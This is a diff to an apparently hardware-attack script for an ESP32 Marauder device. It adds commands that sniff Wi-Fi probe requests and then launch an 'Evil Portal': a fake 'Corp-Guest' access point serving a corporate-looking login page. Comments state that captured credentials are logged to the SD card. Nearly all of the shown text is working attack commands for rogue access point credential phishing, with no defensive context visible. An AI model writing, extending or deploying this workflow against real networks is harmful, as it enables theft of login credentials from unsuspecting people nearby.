@@ -29,9 +29,12 @@ OPTION PORTAL     corporate_guest.html "Evil Portal HTML to serve"
 OPTION TARGET_SSID Corp-Guest   "Target SSID (set after reviewing probe log)"
 
 # ── Phase 1: Passive Probe Sniffing ─────────────────────────────────────────
-# Capture probe requests to identify what networks nearby devices remember
-WIFI_SCAN
+# Capture probe requests to identify what networks nearby devices remember.
+# Marauder CLI: 'sniffprobe' logs probe frames (SSIDs devices are searching for)
+# to the ESP32 SD card at /logs/probes.log.
+WIFI_CMD sniffprobe
 WIFI_WAIT {{SNIFF_SEC}}000
+WIFI_STOP
 
 # ── Phase 2: Record Results ─────────────────────────────────────────────────
 # Open editor and dump probe data for analysis
@@ -79,6 +82,12 @@ WIFI_RESULT
 #
 # The evil portal is active — clients probing for TARGET_SSID will connect.
 # Credentials are logged to /logs/evil_portal.log on the SD card.
+# Marauder CLI: stage the page + AP name on the ESP32, then start the portal.
+WIFI_CMD evilportal -c set html /portals/{{PORTAL}}
+WIFI_WAIT 500
+WIFI_CMD evilportal -c set ap {{TARGET_SSID}}
+WIFI_WAIT 500
+WIFI_CMD evilportal -c start
 
 PLATFORM WIN
   DELAY 500
